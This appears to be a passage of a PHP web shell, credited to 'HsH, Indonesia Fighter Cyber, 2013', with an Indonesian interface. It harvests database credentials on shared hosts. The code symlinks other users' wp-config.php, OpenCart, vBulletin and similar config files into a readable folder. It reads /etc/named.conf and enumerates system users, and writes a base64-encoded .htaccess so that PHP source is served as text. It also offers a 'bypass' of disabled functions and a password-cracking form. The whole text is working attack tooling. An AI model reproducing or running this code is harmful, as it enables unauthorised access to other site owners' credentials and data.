 symlink('/home/'.$usern.'/public_html/includes/iso4217.php',$pdomain.' ~~ includes - HostbillsWhm.txt');
 symlink('/home/'.$usern.'/public_html/hostbills/includes/iso4217.php',$pdomain.' ~~ hostbills - HostbillsWhm.txt');
 symlink('/home/'.$usern.'/public_html/hostbill/includes/iso4217.php',$pdomain.' ~~ hostbill - HostbillsWhm.txt');
symlink('/home/'.$usern.'/public_html/wp-config.php',$pdomain.' ~~ Wordpress.txt');
 symlink('/home/'.$usern.'/public_html/blog/wp-config.php',$pdomain.' ~~ Wordpress.txt');
 symlink('/home/'.$usern.'/public_html/Connections/cms_blog.php',$pdomain.' ~~ admin - cms_blog.txt');
 symlink('/home/'.$usern.'/public_html/web/wp-config.php',$pdomain.' ~~ web - Wordpress .txt');
 symlink('/home/'.$usern.'/public_html/welcome/wp-config.php',$pdomain.' ~~ welcome - Wordpress .txt');
 symlink('/home/'.$usern.'/public_html/store/wp-config.php',$pdomain.' ~~ store - Wordpress .txt');
 symlink('/home/'.$usern.'/public_html/wp/wp-config.php',$pdomain.' ~~ wp - Wordpress.txt');
 symlink('/home/'.$usern.'/public_html/wp/beta/wp-config.php',$pdomain.' ~~ wp - beta - Wordpress.txt');
 symlink('/home/'.$usern.'/public_html/beta/wp-config.php',$pdomain.' ~~ beta - Wordpress.txt');
 symlink('/home/'.$usern.'/public_html/press/wp-config.php',$pdomain.' ~~ press - Wp13.txt');
 symlink('/home/'.$usern.'/public_html/wordpress/wp-config.php',$pdomain.' ~~ wordpress - Wordpress.txt');
 symlink('/home/'.$usern.'/public_html/wordpress/beta/wp-config.php',$pdomain.' ~~ wordpress - beta - Wordpress.txt');
 symlink('/home/'.$usern.'/public_html/news/wp-config.php',$pdomain.' ~~ news - Wordpress.txt');
 symlink('/home/'.$usern.'/public_html/new/wp-config.php',$pdomain.' ~~ new - Wordpress.txt');
 symlink('/home/'.$usern.'/public_html/blogs/wp-config.php',$pdomain.' ~~ blog - Wordpress.txt');
 symlink('/home/'.$usern.'/public_html/home/wp-config.php',$pdomain.' ~~ home - Wordpress.txt');
 symlink('/home/'.$usern.'/public_html/protal/wp-config.php',$pdomain.' ~~ portal - Wordpres.txt');
 symlink('/home/'.$usern.'/public_html/site/wp-config.php',$pdomain.' ~~ site - Wordpress.txt');
 symlink('/home/'.$usern.'/public_html/main/wp-config.php',$pdomain.' ~~ main - Wordpress.txt');
 symlink('/home/'.$usern.'/public_html/test/wp-config.php',$pdomain.' ~~ test - Wordpress.txt');
symlink('/home/'.$usern.'/public_html/Settings.php',$pdomain.' ~~ C M F .txt');
 symlink('/home/'.$usern.'/public_html/system/sistem.php',$pdomain.' ~~ Lokomedia.txt');
 symlink('/home/'.$usern.'/public_html/mk_conf.php',$pdomain.' ~~ mk-portale1.txt');
 symlink('/home/'.$usern.'/public_html/includes/functions.php',$pdomain.' ~~ hpbb3.txt');
 symlink('/home/'.$usern.'/public_html/include/db.php',$pdomain.' ~~ infinity.txt');
 symlink('/home/'.$usern.'/public_html/conf_global.php',$pdomain.' ~~ invisio.txt');
 symlink('/home/'.$usern.'/public_html/application/config/database.php',$pdomain.' ~~ index - user - login open bblog.txt');
 symlink('/home/'.$usern.'/public_html/admin/config.php',$pdomain.' ~~ admin - OpenCart-4.txt');
 symlink('/home/'.$usern.'/public_html/ocart/admin/config.php',$pdomain.' ~~ ocart - admin - OpenCart-4.txt');
 symlink('/home/'.$usern.'/public_html/arcade/functions/dbclass.php',$pdomain.' ~~ IBproarcade.txt'); 
 symlink('/home/'.$usern.'/public_html/forum/includes/class_core.php',$pdomain.' ~~ forum - vbluttin.txt'); 
 symlink('/home/'.$usern.'/public_html/forum/vb/class_core.php',$pdomain.' ~~ vb - vbluttin.txt'); 
 symlink('/home/'.$usern.'/public_html/forum/cc/class_core.php',$pdomain.' ~~ cc - vbluttin.txt'); 
 symlink('/home/'.$usern.'/public_html/connect.php',$pdomain.' ~~ Fusion.txt');
 symlink('/home/'.$usern.'/public_html/oscom/includes/configure.php',$pdomain.' ~~ oscom.txt'); 
 symlink('/home/'.$usern.'/public_html/os/includes/configure.php',$pdomain.' ~~ os - shop.txt.'); 
	}
				$d0mains = @file("/etc/named.conf");
				if($d0mains)
				{
					mkdir($fn);
					chdir($fn);				
					foreach($d0mains as $d0main)
					{
						if(eregi("zone",$d0main))
						{
							preg_match_all('#zone "(.*)"#', $d0main, $domains);
							flush();
							if(strlen(trim($domains[1][0])) > 2)
							{ 
								$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));
								syml($user['name'],$domains[1][0]);					
							}
						}
					}
					echo "<body style='background:#000000;color:#ffffff;font-size:17px;font-family:Tahoma,Verdana,Arial;'><center>[Done] : <span style='color:#00ff00;'>Successfull, </span> <a href=$fn/ style='text-decoration:none;'><input type='button' style='color:#ffffff;background:#111111;border:0;padding:2px;border:1px solid #00ff00;width:80px;' value='Go !'></a> <a href=".$_SERVER['PHP_SELF']." style='text-decoration:none;'><input type='button' style='color:#ffffff;background:#111111;border:0;padding:2px;border:1px solid #00ff00;width:80px;' value='Back !'></a></center></body>";
				}
				else
				{
					mkdir($fn);
					chdir($fn);
					$temp = "";
					$val1 = 0;
					$val2 = 1000;
					for(;$val1 <= $val2;$val1++) 
					{
						$uid = @posix_getpwuid($val1);
						if ($uid)
							$temp .= join(':',$uid)."\n";
					 }
					 echo '<br/>';
					 $temp = trim($temp);
					 $file5 = fopen("test.txt","w");
					 fputs($file5,$temp);
					 fclose($file5);
$htaccess =
'T3B0aW9ucyBhbGwgCkRpcmVjdG9yeUluZGV4IHJlYWRtZS5odG1sIApBZGRUeXBlIHRleHQvcGxh
aW4gLnBocCAKQWRkSGFuZGxlciBzZXJ2ZXItcGFyc2VkIC5waHAgCkFkZFR5cGUgdGV4dC9wbGFp
biAuaHRtbCAKQWRkSGFuZGxlciB0eHQgLmh0bWwgClJlcXVpcmUgTm9uZSAKU2F0aXNmeSBBbnk=
';
$file = fopen(".htaccess","w+");
$write = fwrite ($file ,base64_decode($htaccess));
					 
					 $file = fopen("test.txt", "r") or exit("Unable to open file!");
					 while(!feof($file))
					 {
						$s = fgets($file);
						$matches = array();
						$t = preg_match('/\/(.*?)\:\//s', $s, $matches);
						$matches = str_replace("home/","",$matches[1]);
						if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
							continue;
						syml($matches,$matches);
					 }
					fclose($file);
					echo "</table>";
					unlink("test.txt");
					echo "<body style='background:#000000;color:#ffffff;font-size:17px;font-family:Tahoma,Verdana,Arial;'><center>[Done] : <span style='color:#00ff00;'>Successfull, </span> <a href=$fn/ style='text-decoration:none;'><input type='button' style='color:#ffffff;background:#111111;border:0;padding:2px;border:1px solid #00ff00;width:80px;' value='Go !'></a> <a href=".$_SERVER['PHP_SELF']." style='text-decoration:none;'><input type='button' style='color:#ffffff;background:#111111;border:0;padding:2px;border:1px solid #00ff00;width:80px;' value='Back !'></a></center></body>";
				}
				
exit;
} 
echo "<form method=\"POST\" target=\"_blank\">\n"; 
echo "	\n"; 
echo "<input name=\"page\" type=\"hidden\" value=\"find\">        				\n"; 
echo "    \n"; 
echo "    <table width=\"600\" cellpadding=\"3\" cellspacing=\"1\" align=\"center\" style=\"border:2px solid #1b2;\">\n"; 
echo "    <tr>\n"; 
echo "        <td valign=\"top\" colspan=\"6\" style=\"border-bottom:1px solid #1b2;padding:10px;\"><center><span style=\"font-size:30px;font-weight:bold;text-shadow: #00ff00 0.0em 0.0em 0.2em;\">..::Symlink - Cpanel & Pass DB::..</span><br>\n"; 
echo "		</center></td>\n"; 
echo "    </tr>\n"; 
echo "    <tr>\n"; 
echo "    <td valign=\"top\" style=\"width: 200px;\"><span class=\"label\">Mode Keamanan</span></td>\n"; 
echo "    <td valign=\"top\" colspan=\"5\">\n";

$safe_mode = ini_get('safe_mode');
if($safe_mode=='1')
{
echo 'Menyala';
}else{
echo 'Di Matikan';
}

echo "</td>\n"; 
echo "    </tr>\n"; 
echo "</form>\n"; 
echo "    <tr>\n"; 
echo "    <td valign=\"top\"><span class=\"label\">Fungsi Keamanan</span></td>\n"; 
echo "    <td valign=\"top\" colspan=\"5\">\n"; 
echo "<form method=\"POST\" target=\"_blank\">\n"; 
echo "<input name=\"matikan\" type=\"hidden\" value=\"sekatan\">   \n";
       				
if(''==($func=@ini_get('disable_functions')))
{
echo "<font color=#00FF00 style='position:absolute;'>Berhasil Di Matikan </font>";
echo '<tr><td valign="top"><span class="label">Bypass</span></td><td valign="top" colspan="5"><font color=#00FF00>Berhasil</font></td></tr>';
}else{
echo '<script>alert("\t  Silahkan Lihat Dibawah Dan Tekan \t \n \t --->| Matikan Mode Keamanan! |<--- \t");</script>';
echo "<font color=#FF0000 style='position:absolute;'>$func</font>";
echo '<tr><td valign="top"><span class="label">Bypass</span></td><td valign="top" colspan="5"><input type="submit" value="--->| Matikan Mode Keamanan..! |<---"></td></tr>';
}

echo "</form></td>\n"; 
echo "<form method=\"POST\" target=\"_blank\">\n"; 
echo "<input name=\"mendapatkan\" type=\"hidden\" value=\"passwd\">        				\n"; 
echo "    <tr>\n"; 
echo "    <td valign=\"top\"><span class=\"label\">Auto Symlink</span></td>\n"; 
echo "    <td valign=\"top\"><input size=\"35\" name=\"foldername\" type=\"text\" value=\"Folder-Symlink\"> <input type=\"submit\" value=\"Gooo...\"></td>\n"; 
echo "    </td>\n"; 
echo "    </tr>\n"; 
echo "</form>\n"; 
echo "<form method=\"POST\" target=\"_blank\">\n"; 
echo "<input name=\"pass\" type=\"hidden\" value=\"password\">        				\n"; 
echo "    <tr>\n"; 
echo "    <td valign=\"top\"><span class=\"label\">Krack Pass DB</span></td>\n"; 
echo "    <td valign=\"top\"><input size=\"35\" name=\"url\" type=\"text\" value=\"Masukan Url Symlink\"> <input type=\"submit\" value=\"Gooo...\"></td>\n"; 
echo "    </td>\n"; 
echo "    </tr>\n"; 
echo "</form>\n"; 
echo "    <tr>\n"; 
echo "    <td valign=\"top\">\n"; 
echo "	<span class=\"label\">Daftar Pengguna</span></td>\n"; 
echo "    <td valign=\"top\" colspan=\"5\"><textarea cols=\"40\" rows=\"7\" name=\"usernames\">\n";

system('ls /var/mail');

echo "	</textarea></td>\n"; 
echo "    </tr>\n"; 
echo "    <tr>\n"; 
echo "    <td valign=\"top\">\n"; 
echo "	<span class=\"label\">Daftar Password</span></td>\n"; 
echo "    <td valign=\"top\"colspan=\"5\"><textarea cols=\"40\" rows=\"7\" name=\"passwords\"></textarea></td>\n"; 
echo "    </tr>\n"; 
echo "    <tr>\n"; 
echo "    <td valign=\"top\">\n"; 
echo "	<span class=\"label\">Type</span></td>\n"; 
echo "    <td valign=\"top\" colspan=\"5\">\n"; 
echo "	<input type=\"radio\" name=\"type\" value=\"simple\" checked=\"checked\"><span class=\"label\">Simple</span>\n"; 
echo "	<input type=\"radio\" name=\"type\" value=\"passwd\"><span class=\"label\">/etc/passwd</span>\n"; 
echo "    </td>\n"; 
echo "    </tr>\n"; 
echo "    <tr>\n"; 
echo "    <td valign=\"top\" colspan=\"6\"><center><input type=\"submit\" value=\"==>>Start<<==\"></center></td>\n"; 
echo "    </tr>\n"; 
echo "</form>\n"; 
echo "<tr>\n"; 
echo "<td valign=\"top\" colspan=\"6\" style=\"border-top:1px solid #1b2;\"><center>Recoded By : HsH &copy; | Indonesia Fighter Cyber | 2013</center></td>\n"; 
echo "</tr>\n"; 
echo "</table>\n"; 
echo "</body>\n"; 
echo "</html>\n"; ?>
